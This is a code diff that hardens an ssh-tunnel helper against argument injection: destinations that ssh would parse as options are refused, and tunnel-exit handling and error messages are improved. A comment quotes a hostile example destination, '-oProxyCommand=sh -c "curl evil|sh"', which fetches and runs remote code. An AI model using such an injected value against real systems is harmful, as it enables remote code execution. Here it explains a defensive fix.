@@ -33,6 +33,30 @@ const REMOTE_PORT = 7893;
 /** How long to wait for the remote engine to answer through the tunnel. */
 const CONNECT_TIMEOUT_MS = 30000;
 
+/**
+ * Refuses an ssh destination that ssh would read as an option.
+ *
+ * The destination goes into ssh's argv, and argv has no quoting to hide
+ * behind: a host of `-oProxyCommand=sh -c "curl evil|sh"` is parsed as an
+ * option and runs that command. It reaches here from POST /api/open and
+ * GET /api/ls?host=, which any page in the user's browser can call - the
+ * engine listens on loopback and checks no Origin - so this is not a
+ * well-formedness check, it is the boundary.
+ *
+ * Not validated against ~/.ssh/config: that file is a convenience for
+ * offering hosts, not the set of destinations that are allowed, and
+ * user@host typed by hand has to keep working. What matters is that ssh
+ * cannot mistake it for a flag, and that it is a plausible destination.
+ */
+export function isSafeDestination(host: string): boolean {
+  if (host.length === 0 || host.length > 255) return false;
+  // A leading dash is the whole attack.
+  if (host.startsWith("-")) return false;
+  // user@host, host, an alias, IPv6 in brackets. No spaces, no quotes, no
+  // shell metacharacters - none of which belong in any of those.
+  return /^[A-Za-z0-9._@:\[\]-]+$/.test(host);
+}
+
 export interface Ran {
   code: number;
   out: string;
@@ -50,6 +74,10 @@ export interface Ran {
  */
 export function sshRun(host: string, command: string): Promise<Ran> {
   return new Promise((resolve) => {
+    if (!isSafeDestination(host)) {
+      resolve({ code: 127, out: "", err: "refusing an unsafe ssh destination" });
+      return;
+    }
     const child = spawn(
       "ssh",
       ["-o", "BatchMode=yes", "-o", "ConnectTimeout=15", host, command],
@@ -271,6 +299,10 @@ export async function pushRemote(
   kind: RemoteKind,
   bin: string,
 ): Promise<InstallOutcome> {
+  // scp's destination is argv too, with the same option-injection shape.
+  if (!isSafeDestination(host)) {
+    return { ok: false, error: "refusing an unsafe ssh destination" };
+  }
   if (kind.asset === null) {
     return { ok: false, error: "no gitc binary is published for the remote's platform" };
   }
@@ -451,7 +483,13 @@ function answering(port: number): Promise<boolean> {
  * stderr and carries on regardless, so the connection would look established
  * while pointing at whatever else holds that port.
  */
-export async function connect(host: string, bin: string): Promise<Connection> {
+export async function connect(
+  host: string,
+  bin: string,
+  /** Called if the tunnel ends by itself, so the caller can stop offering it. */
+  onEnded: () => void,
+): Promise<Connection> {
+  if (!isSafeDestination(host)) throw new Error("refusing an unsafe ssh destination");
   const port = await freePort();
   const forward = String(port) + ":127.0.0.1:" + String(REMOTE_PORT);
   // --port= with the equals sign: the space form is ignored, and the engine
@@ -514,6 +552,8 @@ export async function connect(host: string, bin: string): Promise<Connection> {
   // a swept idle host, a closed tab, gitc exiting. Anything else is the
   // tunnel failing underneath us, and only that needs explaining.
   let closedHere = false;
+  /** Set the moment ssh exits, so the readiness loop stops waiting on it. */
+  let ended = false;
   const close = () => {
     closedHere = true;
     try {
@@ -524,6 +564,7 @@ export async function connect(host: string, bin: string): Promise<Connection> {
   };
 
   child.on("exit", (code: number | null) => {
+    ended = true;
     if (closedHere) return;
     const why = stderr.trim();
     const said = remoteSaid.trim();
@@ -532,17 +573,40 @@ export async function connect(host: string, bin: string): Promise<Connection> {
         (why.length > 0 ? " - ssh: " + why : "") +
         (said.length > 0 ? " - remote said: " + said : ""),
     );
+    // Whoever is holding this has to stop holding it. A tunnel that ended by
+    // itself is still in the connection map otherwise, which means the LED
+    // stays green for a host that is gone and the next request proxies into a
+    // dead socket before anything reconnects.
+    onEnded();
   });
 
   const started = Date.now();
   while (Date.now() - started < CONNECT_TIMEOUT_MS) {
     if (await answering(port)) return { host, port, usedAt: Date.now(), close };
+    // ssh has already gone: a refused key under BatchMode, a forward that
+    // could not bind, an engine that exited on a taken port. Waiting out the
+    // remaining thirty seconds to say "no answer" tells the user nothing and
+    // leaves them watching "Opening..." for half a minute.
+    if (ended) break;
     await new Promise((r) => setTimeout(r, 300));
   }
 
   close();
-  const why = stderr.trim();
-  throw new Error(
-    why.length > 0 ? why : "the remote engine did not answer within 30 seconds",
-  );
+  throw new Error(failureReason(stderr, remoteSaid));
+}
+
+/**
+ * The best available explanation for a tunnel that never came up.
+ *
+ * The remote's own words come first. With -tt its stderr is merged into the
+ * pty and arrives on stdout, so ssh's stderr is usually empty or says only
+ * that the connection closed - while the engine over there may have said
+ * exactly why it stopped.
+ */
+function failureReason(sshSaid: string, remoteSaid: string): string {
+  const remote = remoteSaid.trim();
+  if (remote.length > 0) return remote;
+  const ssh = sshSaid.trim();
+  if (ssh.length > 0) return ssh;
+  return "the remote engine did not answer within 30 seconds";
 }
